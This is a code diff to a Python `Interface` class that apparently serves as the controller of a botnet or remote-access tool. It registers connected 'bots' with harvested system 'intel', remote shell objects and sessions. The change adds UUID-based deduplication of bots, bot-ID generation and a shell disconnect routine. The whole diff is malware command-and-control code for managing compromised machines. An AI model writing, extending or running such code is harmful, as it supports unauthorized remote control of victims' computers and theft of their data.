@@ -50,33 +50,48 @@ class Interface(object):
   self.ftp = None 
   self.sig = self.signature
   
- @property 
- def bot_id(self):
-  while 1:
-   found = False 
-   bot_id = sha256(urandom(64 * 32) + urandom(64 * 64)).digest().hex()
-   
-   for bot in self.bots:
-    if self.bots[bot]['bot_id'] == bot_id:
-     found = True 
-     break
-
-   if not found:
-    return bot_id
+ def gen_bot_id(self, uuid):
+  bot_ids = [self.bots[bot]['bot_id'] for bot in self.bots]
+  while 1: 
+   bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)).digest().hex() + uuid).encode()).digest().hex()
+   if not bot_id in bot_ids:break 
+  return bot_id
 
  @property
  def signature(self):
   bots = b''
   for bot in self.bots:
    bot_id = self.bots[bot]['bot_id']
-   bot_id = bot_id[:4] + bot_id[-4:]
+   bot_id = bot_id[:4] + bot_id[-4:] 
    bots += bot_id.encode()
   return sha256(bots).digest().hex()
     
+ def is_connected(self, uuid):
+  for bot in self.bots:
+   if self.bots[bot]['uuid'] == uuid:
+    return True 
+  return False
+ 
  def connect_client(self, sess_obj, conn_info, shell):
-  self.bots[sess_obj] = { 'bot_id': self.bot_id, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
-  self.sig = self.signature  
-  print(self.bots)
+  uuid = conn_info['args']['sys_info']['uuid']
+
+  if self.is_connected(uuid):
+   self.close_sess(sess_obj, shell)
+  else:
+   bot_id = self.gen_bot_id(uuid)
+   self.bots[sess_obj] = { 'bot_id': bot_id, 'uuid': uuid, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
+   self.sig = self.signature  
+   print(self.bots)
+
+ def close_sess(self, sess_obj, shell_obj):
+  print('Closing session ...')
+  shell_obj.is_alive = False
+  shell_obj.send(code=7, args=None) # 7 - disconnect
+  
+  sess_obj.close()
+  if sess_obj in self.bots:
+   del self.bots[sess_obj]
+  self.sig = self.signature
 
  def disconnect_client(self, sess_obj):
   print('Disconnecting client ...')
@@ -89,10 +104,8 @@ class Interface(object):
      self.ftp.close()
      self.ftp = None 
 
-   del self.bots[sess_obj]
-   sess_obj.close()
-   self.sig = self.signature
-
+   self.close_sess(sess_obj, self.bots[sess_obj]['shell'])
+   
  def disconnect_all(self):
   for bot_id in [bot_id for bot_id in self.bots]:
    self.disconnect_client(bot_id)
@@ -107,7 +120,7 @@ class Interface(object):
 
   if bot:
    if self.ssh:
-    self.ssh.close()
+    self.ssh.close() 
 
    self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT, max_time=30, verbose=True)
    sock_obj = self.ssh.start()
